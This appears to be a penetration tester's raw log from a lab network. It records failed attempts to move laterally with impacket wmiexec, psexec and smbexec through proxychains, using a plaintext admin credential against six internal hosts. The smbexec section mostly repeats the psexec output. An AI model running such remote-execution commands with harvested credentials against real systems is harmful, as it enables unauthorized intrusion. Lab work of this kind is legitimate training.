wmiexec attempt
```bash
#failed trying to go to DC
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:25:15] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.5
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

#failed trying to go to MS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:26:22] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.30
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

# failed trying to go to FS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:26:29] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.26
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

# failed trying to go to WSADM
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:26:29] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.36
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

# failed trying to go to WS02
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:26:29] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.101
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

# failed trying to go to SQL01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:26:29] 
 └─╼ # proxychains impacket-wmiexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

```
psexec attempt

```bash
#failed trying to go to DC
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:36:04] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.5
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.5.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

#failed trying to go to MS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:37:06] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.30
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.30.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to FS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:37:35] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.26
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.26.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Users' is not writable.

# failed trying to go to WSADM
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:38:03] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.36
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.36.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to WS02
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:38:42] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.101
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.101.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to SQL01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:39:27] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.15.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

```
smbexec
```bash
#failed trying to go to DC
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:36:04] 
 └─╼ # proxychains impacket-smbexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.5

#failed trying to go to MS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:37:06] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.30
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.30.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to FS01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:37:35] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.26
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.26.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Users' is not writable.

# failed trying to go to WSADM
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:38:03] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.36
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.36.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to WS02
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:38:42] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.101
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.101.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

# failed trying to go to SQL01
[root💀~/offshore/ms01/scans] [10.10.14.39] [2023-10-20 14:39:27] 
 └─╼ # proxychains impacket-psexec ned.flanders_adm:'Lefthandedyeah!'@172.16.1.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.1.15.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```
```
smbclient \\\\172.16.1.36\\ -U ned.flanders_adm
```
